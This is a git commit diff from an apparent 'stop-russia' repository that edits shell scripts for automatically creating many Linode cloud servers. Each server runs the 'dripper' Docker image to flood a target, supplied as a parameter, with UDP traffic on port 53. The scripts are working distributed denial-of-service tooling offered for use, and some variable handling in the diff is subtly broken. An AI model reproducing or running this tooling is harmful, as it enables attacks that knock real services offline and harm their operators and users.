66ba8847c924c7e0219ae386d30a8e57cb8a41df
ibrzhv <i-brzhv@protonmail.com>
2022-03-15 20:07:35 +0200

    go

--- automation/linode/init.sh
+++ automation/linode/init.sh
@@ -16,10 +16,13 @@ linode-cli stackscripts create \
   --label stop-russia \
   --images "linode/ubuntu20.04" \
   --is_public false \
-  --script userdata.sh $3
+  --script userdata.sh
 
 STACK_SCRIPT_ID=$(linode-cli stackscripts list --is_public false |  grep stop-russia | awk '{print $2}' | head -n1)
 
+STACK_SCRIPT_DATA="{ 'TARGET': '$3'}"
+
+echo STACK_SCRIPT_DATA
 for ((c=1; c<=NUMDROPLES; c++))
 do
   linode-cli linodes create \
@@ -29,6 +32,7 @@ do
     --booted true \
     --root_pass "$2" \
     --stackscript_id $STACK_SCRIPT_ID \
+    --stackscript_data STACK_SCRIPT_DATA \
     --region $REGION \
     --type g6-nanode-1
 done
--- automation/linode/userdata.sh
+++ automation/linode/userdata.sh
@@ -5,6 +5,4 @@ apt -y install docker.io git
 
 fallocate -l 1G /swapfile && chmod 600 /swapfile && mkswap /swapfile && swapon /swapfile 
 
-git clone https://github.com/brzhv-cyb/stop-russia.git
-
-cd stop-russia && screen -d -m docker run -it --rm alexmon1989/dripper:latest -s $1 -p 53 -t 1 -m udp -l 2048
+screen -d -m docker run -it --rm alexmon1989/dripper:latest -s ${TARGET} -p 53 -t 5 -m udp -l 2048
